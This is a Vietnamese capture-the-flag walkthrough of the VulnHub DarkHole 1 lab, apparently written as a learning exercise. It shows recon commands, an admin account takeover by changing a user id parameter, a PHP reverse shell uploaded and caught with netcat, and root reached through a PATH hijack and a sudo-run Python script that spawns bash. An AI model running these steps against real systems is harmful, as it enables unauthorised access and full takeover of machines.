#LAB9:DARKHOLE 1
```
https://www.vulnhub.com/entry/darkhole-1,724/
```
## Chuẩn bị
* Kali Linux: 10.3.0.165

![image](https://user-images.githubusercontent.com/92532460/224473879-0a5eadb8-cb89-44d6-a90e-d56535a139ec.png)

* Máy victim: Darkhole1

![image](https://user-images.githubusercontent.com/92532460/224473916-7973ba1b-46d1-4099-913c-691885815365.png)
## Xác định mục tiêu
* Bước đầu tiên là chạy lệnh Netdetect để xác định địa chỉ IP của máy mục tiêu. Trong ảnh chụp màn hình bên dưới, Netdetect đã cung cấp cho chúng tôi danh sách tất cả các địa chỉ IP khả dụng. Nó có thể được nhìn thấy trong ảnh chụp màn hình sau đây
```
netdiscover -i eth0 -r 10.3.0.0/24
```
![image](https://user-images.githubusercontent.com/92532460/224474010-e8ac90b3-f3f6-4449-8994-ae37c12dbcdf.png)

* Xác định được máy mục tiêu có IP là 10.3.0.182
* Bước thứ hai là chạy quét cổng để xác định các cổng và dịch vụ đang mở trên máy mục tiêu
```
nmap -sC -sV 10.3.0.182  
```

![image](https://user-images.githubusercontent.com/92532460/224474133-fd76c009-237e-4aab-9c5a-c5642fcde3b5.png)
 
* Đầu ra của Nmap cho thấy hai cổng mở đã được xác định là Mở trong quá trình quét toàn bộ cổng. Cổng 80 đang được sử dụng cho dịch vụ HTTP và cổng 22 đang được sử dụng cho dịch vụ SSH.

* Trong bước tiếp theo, chúng tôi sẽ bắt đầu CTF với Cổng 80.
## Khai thác
* Bước 3 Hãy bắt đầu CTF bằng cách khám phá cổng HTTP. Chúng tôi đã mở địa chỉ IP của máy mục tiêu trên trình duyệt.

![image](https://user-images.githubusercontent.com/92532460/224474669-621ff4c0-6281-4996-a7fe-f8c8c26f64e8.png)

* Trong ảnh chụp màn hình ở trên, chúng ta có thể thấy ứng dụng đích. Có một chức năng đăng nhập, vì vậy hãy chuyển đến trang đăng nhập. Trang đăng nhập có thể được nhìn thấy dưới đây.

![image](https://user-images.githubusercontent.com/92532460/224474715-2a1e9e0e-44a8-4a92-96e8-90e404007370.png)

* Ở đây, chúng tôi có chức năng đăng nhập cũng như đăng ký. Vì vậy, chúng tôi đã nhấp vào 'đăng ký' để đăng ký làm người dùng mới trên ứng dụng mục tiêu.

![image](https://user-images.githubusercontent.com/92532460/224474888-5d9f5762-9bda-4af0-a876-a2c2a5202159.png)
* Chúng tôi đã đăng ký với tư cách là người dùng mới trên máy mục tiêu và yêu cầu với các chi tiết được cung cấp có thể được nhìn thấy ở trên bị chặn trong cửa sổ BurpSuite. Hãy sử dụng những chi tiết này để đăng nhập vào ứng dụng mục tiêu.

![image](https://user-images.githubusercontent.com/92532460/224549700-920d3e89-9d98-4cb2-b68c-50aacb7dbff2.png)

* Có chức năng thay đổi mật khẩu cho người dùng hiện tại với lỗi quản lý phiên. Chúng tôi đã chặn yêu cầu thay đổi mật khẩu trong burp và thấy rằng thay đổi mật khẩu phụ thuộc vào tham số id.

![image](https://user-images.githubusercontent.com/92532460/224550144-fc94b52a-a630-4084-8588-a6e6fb5811a6.png)

* Chúng tôi đã thay đổi giá trị id người dùng hiện tại từ 3 thành id của người dùng quản trị viên, tức là 1. Thông qua đó, chúng tôi có thể thay đổi mật khẩu cho quản trị viên người dùng. Sau đó, chúng tôi đã đăng nhập vào ứng dụng đích với tư cách là quản trị viên người dùng. Chúng tôi bắt đầu khám phá thêm chức năng thông qua người dùng quản trị.

![image](https://user-images.githubusercontent.com/92532460/224550228-8976e3ca-83c7-46b0-963f-874ce0b2fedf.png)

* Chúng tôi đã tìm thấy chức năng tải tệp lên trong ứng dụng mục tiêu. Nó dễ bị tải lên tệp độc hại. Chúng tôi có thể tải lên trình bao PHP thông qua điều này và có quyền truy cập vào máy mục tiêu.
![image](https://user-images.githubusercontent.com/92532460/224550321-81b64b17-84d8-4ce9-8881-c783ff68e69d.png)

![image](https://user-images.githubusercontent.com/92532460/224491232-5c6b33c9-9610-41a7-990f-554a467044e6.png)

* Bước 4 Trên máy kẻ tấn công của chúng tôi, chúng tôi đã tạo một tải trọng ở dạng trình bao PHP để lấy trình bao đảo ngược từ máy mục tiêu.
```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```
![image](https://user-images.githubusercontent.com/92532460/224553679-bd7ddc3e-ed75-47d9-9ea7-7a8e64c942a9.png)

* Copy ra thư mục user và đổi tên file thành shell.phtml
```
cp php-reverse-shell/php-reverse-shell.php shell.phtml
```
* Sử dụng lệnh nano để sửa ip thành 10.3.0.165
```
nano shell.phtml
```
![image](https://user-images.githubusercontent.com/92532460/224553989-9c0b3209-ac64-40ad-9063-16580fc47849.png)

* Tiến hành tải file shell.phtml lên máy chủ web mục tiêu

![image](https://user-images.githubusercontent.com/92532460/224554121-77cb058a-7728-47b7-bd57-08b03d868644.png)

* Nhấn vào biểu tưởng file để dẫn ra một đường dẫn khác

![image](https://user-images.githubusercontent.com/92532460/224554188-f091a9ff-01f9-492f-bbec-f7a552794e98.png)

* Tại máy tấn công dùng lệnh nc để lắng nghe trên cổng 1234
```
nc -lnvp 1234
```
* Chuyển sang web kích hoạt file shell.phtml
* Sau khi kích hoạt bạn đã chiếm được quyền truy cập

![image](https://user-images.githubusercontent.com/92532460/224554284-89a609d0-85f9-4a43-b405-5218eee46281.png)

* Lệnh ```python3 -c 'import pty;pty.spawn("/bin/bash")'``` sẽ bắt đầu một phiên bản tương tác trên terminal TTY (Teletype) sử dụng module pty của Python để khởi tạo một shell mới trên máy nạn nhân

![image](https://user-images.githubusercontent.com/92532460/224554441-00735aea-cdf5-48fe-9425-46fae3fe72b3.png)

* Khi bạn thiết lập TERM thành xterm, hệ thống sẽ biết cách hiển thị các ứng dụng dòng lệnh của bạn một cách chính xác trên giao diện xterm, bao gồm cả các tính năng đồ họa và các biểu tượng đặc biệt. Việc này giúp đảm bảo rằng các ứng dụng của bạn hiển thị đúng cách trên giao diện của hệ thống.
```
export TERM=xterm
```
![image](https://user-images.githubusercontent.com/92532460/224554550-871263e9-ad2e-4909-a853-809368f19e5c.png)

* Dùng ls -l xem quyền của user trong /home
```
cd /home
ls -l
```
![image](https://user-images.githubusercontent.com/92532460/224554659-c774f3d6-faf5-4451-9715-73d545e9cb98.png)

* Có thể thấy user john sở hữu full quyền, sau đó vào thư mục john và ls -l
```
cd john/
ls -l
```

![image](https://user-images.githubusercontent.com/92532460/224554785-bd60e01c-a2e9-4023-8951-4c8ff57f2d7a.png)

* Thấy có file toto được quyền root, chạy lệnh sau
```
./toto
cat toto
```
![image](https://user-images.githubusercontent.com/92532460/224554904-aee0d5d1-2035-4072-b8e8-a398a75e2da8.png)
* Thấy được id của john và file shell chạy lệnh id
* Chạy lệnh sau để leo thang đặc quyền với id
```
echo 'bash' > /tmp/id; chmod +x /tmp/id; export PATH=/tmp:$PATH
./toto
cat user.txt
```
![image](https://user-images.githubusercontent.com/92532460/224555005-b00ae72d-a72d-46a6-b18c-c8a3914ee008.png)

## Leo thang đặc quyền với root
* Xem file ```password``` để xem mật khẩu
```
cat password
```
![image](https://user-images.githubusercontent.com/92532460/224555310-9634fa02-26b5-4591-9511-ef9d7c57cc54.png)

* Sau khi xem file ```password```, biết được mật khẩu là ```root123```
* Thực hiện lệnh
```
sudo -l
```
![image](https://user-images.githubusercontent.com/92532460/224555400-3032fe02-8261-4866-9852-8cf914fb7a86.png)

Sau khi xem phân quyền file thấy có file ```file.py```, Thực hiên thay đổi file ```file.py``` bằng câu lệnh sau
```
nano file.py
```
```
import os
os.system("/bin/bash")
```
![image](https://user-images.githubusercontent.com/92532460/224556907-37e9c386-7f97-4ddf-a86d-44771e5f3b84.png)

* Sau đó chạy lệnh
```
sudo -u root /usr/bin/python3 /home/john/file.py
```
![image](https://user-images.githubusercontent.com/92532460/224556935-83bd0007-3e6e-4f07-bec0-aa5d615b51cf.png)

* Thành công vào được root
```
cd /root
ll
cat root.txt
```
![image](https://user-images.githubusercontent.com/92532460/224556974-6ede1cbc-ff1a-4a4f-b753-6310674d5757.png)








